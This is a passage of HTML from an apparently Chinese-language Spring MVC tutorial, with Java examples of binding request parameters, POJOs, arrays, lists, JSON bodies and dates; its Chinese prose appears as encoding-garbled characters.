string">"æ™®é€šå‚æ•°ä¼ é€’ userName ==&gt; "</span><span class="token operator">+</span>userName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ™®é€šå‚æ•°ä¼ é€’ age ==&gt; "</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'common param different name'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>åç§°ï¼š@RequestParam</li><li>ç±»å‹ï¼šå½¢å‚æ³¨è§£</li><li>ä½ç½®ï¼šSpringMVCæ§åˆ¶å™¨æ–¹æ³•å½¢å‚å®šä¹‰å‰é¢</li><li>ä½œç”¨ï¼šç»‘å®šè¯·æ±‚å‚æ•°ä¸å¤„ç†å™¨æ–¹æ³•å½¢å‚é—´çš„å…³ç³»</li><li>å‚æ•°ï¼š</li><li>requiredï¼šæ˜¯å¦ä¸ºå¿…ä¼ å‚æ•°</li><li>defaultValueï¼šå‚æ•°é»˜è®¤å€¼</li></ul></blockquote><p><strong>POJOç±»å‹å‚æ•°</strong></p><ul><li>POJOå‚æ•°ï¼šè¯·æ±‚å‚æ•°åä¸å½¢å‚å¯¹è±¡å±æ€§åç›¸åŒï¼Œå®šä¹‰POJOç±»å‹å½¢å‚å³å¯æ¥æ”¶å‚æ•°</li></ul><p>Userç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Address</span> address<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"User{"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">", address="</span> <span class="token operator">+</span> address <span class="token operator">+</span>                <span class="token char">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Address</span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> address<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token class-name">Address</span> address<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>address <span class="token operator">=</span> address<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>UserControllerç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//POJOå‚æ•°ï¼šè¯·æ±‚å‚æ•°ä¸å½¢å‚å¯¹è±¡ä¸­çš„å±æ€§å¯¹åº”å³å¯å®Œæˆå‚æ•°ä¼ é€’</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoParam"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoParam</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojoå‚æ•°ä¼ é€’ user ==&gt; "</span><span class="token operator">+</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'pojo param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„äº‹é¡¹ï¼šè¯·æ±‚å‚æ•°keyçš„åç§°è¦å’ŒPOJOä¸­å±æ€§çš„åç§°ä¸€è‡´ï¼Œå¦åˆ™æ— æ³•å°è£…ã€‚</p></blockquote><p><strong>åµŒå¥—POJOç±»å‹å‚æ•°</strong></p><p>è¯·æ±‚å‚æ•°åä¸å½¢å‚å¯¹è±¡å±æ€§åç›¸åŒï¼ŒæŒ‰ç…§å¯¹è±¡å±‚æ¬¡ç»“æ„å…³ç³»å³å¯æ¥æ”¶åµŒå¥—POJOå±æ€§å‚æ•°</p><p>æ–°æ·»Addressç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Address</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> province<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> city<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Address{"</span> <span class="token operator">+</span>                <span class="token string">"province='"</span> <span class="token operator">+</span> province <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", city='"</span> <span class="token operator">+</span> city <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token char">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getProvince</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> province<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setProvince</span><span class="token punctuation">(</span><span class="token class-name">String</span> province<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>province <span class="token operator">=</span> province<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getCity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> city<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCity</span><span class="token punctuation">(</span><span class="token class-name">String</span> city<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>city <span class="token operator">=</span> city<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>UserControllerç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//åµŒå¥—POJOå‚æ•°ï¼šåµŒå¥—å±æ€§æŒ‰ç…§å±‚æ¬¡ç»“æ„è®¾å®šåç§°å³å¯å®Œæˆå‚æ•°ä¼ é€’</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoContainPojoParam"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoContainPojoParam</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojoåµŒå¥—pojoå‚æ•°ä¼ é€’ user ==&gt; "</span><span class="token operator">+</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'pojo contain pojo param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ•°ç»„ç±»å‹å‚æ•°</strong></p><ul><li><p>æ•°ç»„å‚æ•°ï¼šè¯·æ±‚å‚æ•°åä¸å½¢å‚å¯¹è±¡å±æ€§åç›¸åŒä¸”è¯·æ±‚å‚æ•°ä¸ºå¤šä¸ªï¼Œå®šä¹‰æ•°ç»„ç±»å‹å³å¯æ¥æ”¶å‚æ•°</p><p>UserControllerç±»ï¼š</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//æ•°ç»„å‚æ•°ï¼šåŒåè¯·æ±‚å‚æ•°å¯ä»¥ç›´æ¥æ˜ å°„åˆ°å¯¹åº”åç§°çš„å½¢å‚æ•°ç»„å¯¹è±¡ä¸­</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/arrayParam"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">arrayParam</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> likes<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ•°ç»„å‚æ•°ä¼ é€’ likes ==&gt; "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>likes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'array param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="image-20210805105825688.png" style="zoom: 50%;"><p><strong>é›†åˆç±»å‹å‚æ•°</strong></p><ul><li>é›†åˆä¿å­˜æ™®é€šå‚æ•°ï¼šè¯·æ±‚å‚æ•°åä¸å½¢å‚é›†åˆå¯¹è±¡åç›¸åŒä¸”è¯·æ±‚å‚æ•°ä¸ºå¤šä¸ªï¼Œ@RequestParamç»‘å®šå‚æ•°å…³ç³»</li></ul><img src="image-20210805105957957.png" style="zoom: 50%;"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é›†åˆå‚æ•°ï¼šåŒåè¯·æ±‚å‚æ•°å¯ä»¥ä½¿ç”¨@RequestParamæ³¨è§£æ˜ å°„åˆ°å¯¹åº”åç§°çš„é›†åˆå¯¹è±¡ä¸­ä½œä¸ºæ•°æ®</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParam"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParam</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> likes<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"é›†åˆå‚æ•°ä¼ é€’ likes ==&gt; "</span><span class="token operator">+</span> likes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'list param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="jsonæ•°æ®å‚æ•°ä¼ é€’"><a href="#jsonæ•°æ®å‚æ•°ä¼ é€’" class="headerlink" title="jsonæ•°æ®å‚æ•°ä¼ é€’"></a>jsonæ•°æ®å‚æ•°ä¼ é€’</h4><p><strong>ä¼ é€’jsonæ™®é€šæ•°ç»„</strong></p><ol><li>æ·»åŠ jsonæ•°æ®è½¬æ¢ç›¸å…³åæ ‡</li></ol><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>å¼€å¯è‡ªåŠ¨è½¬æ¢jsonæ•°æ®çš„æ”¯æŒ</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.yang.controller"</span><span class="token punctuation">)</span><span class="token comment">//å¼€å¯jsonæ•°æ®ç±»å‹è‡ªåŠ¨è½¬æ¢</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>@EnableWebMvcæ³¨è§£åŠŸèƒ½å¼ºå¤§ï¼Œè¯¥æ³¨è§£æ•´åˆäº†å¤šä¸ªåŠŸèƒ½ï¼Œæ­¤å¤„ä»…ä½¿ç”¨å…¶ä¸­ä¸€éƒ¨åˆ†åŠŸèƒ½ï¼Œå³jsonæ•°æ®è¿›è¡Œè‡ªåŠ¨ç±»å‹è½¬æ¢</p></blockquote><ol start="3"><li>åœ¨Controllerä¸­ç¼–å†™æ–¹æ³•æ¥æ”¶jsonå‚æ•°</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é›†åˆå‚æ•°ï¼šjsonæ ¼å¼</span><span class="token comment">//1.å¼€å¯jsonæ•°æ®æ ¼å¼çš„è‡ªåŠ¨è½¬æ¢ï¼Œåœ¨é…ç½®ç±»ä¸­å¼€å¯@EnableWebMvc</span><span class="token comment">//2.ä½¿ç”¨@RequestBodyæ³¨è§£å°†å¤–éƒ¨ä¼ é€’çš„jsonæ•°ç»„æ•°æ®æ˜ å°„åˆ°å½¢å‚çš„é›†åˆå¯¹è±¡ä¸­ä½œä¸ºæ•°æ®</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParamForJson"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> likes<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list common(json)å‚æ•°ä¼ é€’ list ==&gt; "</span><span class="token operator">+</span>likes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'list common for json param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>@EnableWebMvcæ³¨è§£ä»‹ç»</strong></p><ul><li>åç§°ï¼š@EnableWebMvc</li><li>ç±»å‹ï¼šé…ç½®ç±»æ³¨è§£</li><li>ä½ç½®ï¼šSpringMVCé…ç½®ç±»å®šä¹‰ä¸Šæ–¹</li><li>ä½œç”¨ï¼šå¼€å¯SpringMVCå¤šé¡¹è¾…åŠ©åŠŸèƒ½</li><li>èŒƒä¾‹ï¼š</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.yang.controller"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>@RequestBodyæ³¨è§£ä»‹ç»</strong></p><ul><li>åç§°ï¼š@RequestBody</li><li>ç±»å‹ï¼šå½¢å‚æ³¨è§£</li><li>ä½ç½®ï¼šSpringMVCæ§åˆ¶å™¨æ–¹æ³•å½¢å‚å®šä¹‰å‰é¢</li><li>ä½œç”¨ï¼šå°†è¯·æ±‚ä¸­è¯·æ±‚ä½“æ‰€åŒ…å«çš„æ•°æ®ä¼ é€’ç»™è¯·æ±‚å‚æ•°ï¼Œæ­¤æ³¨è§£ä¸€ä¸ªå¤„ç†å™¨æ–¹æ³•åªèƒ½ä½¿ç”¨ä¸€æ¬¡</li><li>èŒƒä¾‹ï¼š</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParamForJson"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> likes<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list common(json)å‚æ•°ä¼ é€’ list ==&gt; "</span><span class="token operator">+</span>likes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'list common for json param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ä¼ é€’jsonå¯¹è±¡</strong></p><ul><li>POJOå‚æ•°ï¼šjsonæ•°æ®ä¸å½¢å‚å¯¹è±¡å±æ€§åç›¸åŒï¼Œå®šä¹‰POJOç±»å‹å½¢å‚å³å¯æ¥æ”¶å‚æ•°</li></ul><img src="image-20210805111544701.png" style="zoom: 33%;"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//POJOå‚æ•°ï¼šjsonæ ¼å¼</span><span class="token comment">//1.å¼€å¯jsonæ•°æ®æ ¼å¼çš„è‡ªåŠ¨è½¬æ¢ï¼Œåœ¨é…ç½®ç±»ä¸­å¼€å¯@EnableWebMvc</span><span class="token comment">//2.ä½¿ç”¨@RequestBodyæ³¨è§£å°†å¤–éƒ¨ä¼ é€’çš„jsonæ•°æ®æ˜ å°„åˆ°å½¢å‚çš„å®ä½“ç±»å¯¹è±¡ä¸­ï¼Œè¦æ±‚å±æ€§åç§°ä¸€ä¸€å¯¹åº”</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoParamForJson"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojo(json)å‚æ•°ä¼ é€’ user ==&gt; "</span><span class="token operator">+</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'pojo for json param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ä¼ é€’jsonå¯¹è±¡æ•°ç»„</strong></p><ul><li><p>POJOé›†åˆå‚æ•°ï¼šjsonæ•°ç»„æ•°æ®ä¸é›†åˆæ³›å‹å±æ€§åç›¸åŒï¼Œå®šä¹‰Listç±»å‹å½¢å‚å³å¯æ¥æ”¶å‚æ•°</p><img src="image-20210805111626095.png" style="zoom: 33%;"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é›†åˆå‚æ•°ï¼šjsonæ ¼å¼</span><span class="token comment">//1.å¼€å¯jsonæ•°æ®æ ¼å¼çš„è‡ªåŠ¨è½¬æ¢ï¼Œåœ¨é…ç½®ç±»ä¸­å¼€å¯@EnableWebMvc</span><span class="token comment">//2.ä½¿ç”¨@RequestBodyæ³¨è§£å°†å¤–éƒ¨ä¼ é€’çš„jsonæ•°ç»„æ•°æ®æ˜ å°„åˆ°å½¢å‚çš„ä¿å­˜å®ä½“ç±»å¯¹è±¡çš„é›†åˆå¯¹è±¡ä¸­ï¼Œè¦æ±‚å±æ€§åç§°ä¸€ä¸€å¯¹åº”</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listPojoParamForJson"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listPojoParamForJson</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list pojo(json)å‚æ•°ä¼ é€’ list ==&gt; "</span><span class="token operator">+</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'list pojo for json param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>@RequestBodyä¸@RequestParamåŒºåˆ«</strong></p><ul><li><p>åŒºåˆ«<br>@RequestParamç”¨äºæ¥æ”¶urlåœ°å€ä¼ å‚ï¼Œè¡¨å•ä¼ å‚ã€application/x-www-form-urlencodedã€‘</p><p>@RequestBodyç”¨äºæ¥æ”¶jsonæ•°æ®ã€application/jsonã€‘</p></li><li><p>åº”ç”¨</p><p>åæœŸå¼€å‘ä¸­ï¼Œå‘é€jsonæ ¼å¼æ•°æ®ä¸ºä¸»ï¼Œ@RequestBodyåº”ç”¨è¾ƒå¹¿</p><p>å¦‚æœå‘é€éjsonæ ¼å¼æ•°æ®ï¼Œé€‰ç”¨@RequestParamæ¥æ”¶è¯·æ±‚å‚æ•°</p></li></ul><h4 id="æ—¥æœŸç±»å‹å‚æ•°ä¼ é€’"><a href="#æ—¥æœŸç±»å‹å‚æ•°ä¼ é€’" class="headerlink" title="æ—¥æœŸç±»å‹å‚æ•°ä¼ é€’"></a>æ—¥æœŸç±»å‹å‚æ•°ä¼ é€’</h4><ul><li>æ—¥æœŸç±»å‹æ•°æ®åŸºäºç³»ç»Ÿä¸åŒæ ¼å¼ä¹Ÿä¸å°½ç›¸åŒ<br>2088-08-18<br>2088/08/18<br>08/18/2088</li><li>æ¥æ”¶å½¢å‚æ—¶ï¼Œæ ¹æ®ä¸åŒçš„æ—¥æœŸæ ¼å¼è®¾ç½®ä¸åŒçš„æ¥æ”¶æ–¹å¼</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//æ—¥æœŸå‚æ•° http://localhost:80/dataParam?date=2088/08/08&amp;date1=2088-08-18&amp;date2=2088/08/28 8:08:08</span><span class="token comment">//ä½¿ç”¨@DateTimeFormatæ³¨è§£è®¾ç½®æ—¥æœŸç±»å‹æ•°æ®æ ¼å¼ï¼Œé»˜è®¤æ ¼å¼yyyy/MM/dd</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/dataParam"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">dataParam</span><span class="token punctuation">(</span><span class="token class-name">Date</span> date<span class="token punctuation">,</span>                  <span class="token annotation punctuation">@DateTimeFormat</span><span class="token punctuation">(</span>pattern<span class="token operator">=</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span> <span class="token class-name">Date</span> date1<span class="token punctuation">,</span>                  <span class="token annotation punctuation">@DateTimeFormat</span><span class="token punctuation">(</span>pattern<span class="token operator">=</span><span class="token string">"yyyy/MM/dd HH:mm:ss"</span><span class="token punctuation">)</span> <span class="token class-name">Date</span> date2<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å‚æ•°ä¼ é€’ date ==&gt; "</span><span class="token operator">+</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å‚æ•°ä¼ é€’ date1(yyyy-MM-dd) ==&gt; "</span><span class="token operator">+</span>date1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å‚æ•°ä¼ é€’ date2(yyyy/MM/dd HH:mm:ss) ==&gt; "</span><span class="token operator">+</span>date2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"{'module':'data param'}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>@DateTimeFormatæ³¨è§£ä»‹ç»</strong></p><ul><li><p>åç§°ï¼š@DateTimeFormat</p></li><li><p>ç±»å‹ï¼šå½¢å‚æ³¨è§£</p></li><li><p>ä½ç½®ï¼šSpringMVCæ§åˆ¶å™¨æ–¹æ³•å½¢å‚å‰é¢</p></li><li><p>ä½œç”¨ï¼šè®¾å®šæ—¥æœŸæ—¶é—´å‹æ•°æ®æ 